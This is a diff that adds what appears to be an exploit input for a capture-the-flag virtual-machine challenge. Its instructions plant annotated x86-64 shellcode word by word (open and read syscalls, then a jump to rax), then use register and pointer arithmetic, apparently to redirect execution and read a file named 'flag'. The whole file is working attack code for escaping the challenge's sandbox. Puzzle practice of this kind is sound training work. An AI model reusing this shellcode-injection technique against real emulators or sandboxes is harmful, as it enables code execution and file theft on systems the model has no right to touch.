@@ -1,0 +1,73 @@
+67
+m r17 0debf589 #mov ebp,esi
+m r17 0deb10b2 #mov dl, 0x10
+m r17 0debd789 #mov edi, edx
+m r17 0debda89 #mov edx, ebx (0x200)
+m r17 0debcaff #dec edx (0x1ff)
+m r17 0debf631 #xor esi, esi
+m r17 0debc031 #xor eax, eax
+m r17 0deb02b0 #mov al, 2
+m r17 0deb050f #syscall (open)
+m r17 0debfb89 #mov    ebx,edi
+m r17 0deb00b3 #mov    bl,0x0
+m r17 0debde89 #mov    esi,ebx
+m r17 0debc789 #mov edi, eax
+m r17 0debc031 #xor eax, eax
+m r17 0debd231 #xor edx, edx
+m r17 0deb08b2 #mov dl, 0x8
+m r17 0deb050f #syscall (read)
+m r17 0debf289 #mov edx, esi
+m r17 0debe889 #mov eax, ebp
+m r17 0debc8ff #dec eax
+m r17 0debe0b0 #mv al, 0xe0
+m r17 0debe0ff #jmp rax
+m r17 77cc
+m r4 r3
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+a r4 r4 r4
+s r4 r4 200
+m r10 200
+m r20 r4
+a r0 r20 [r10
+m r9 [r20
+m r7 r9
+a r7 r7 3
+a r0 r7 [r10
+j 8
+m r0 r7
+4
+1
+0
+67616c66
+10000000
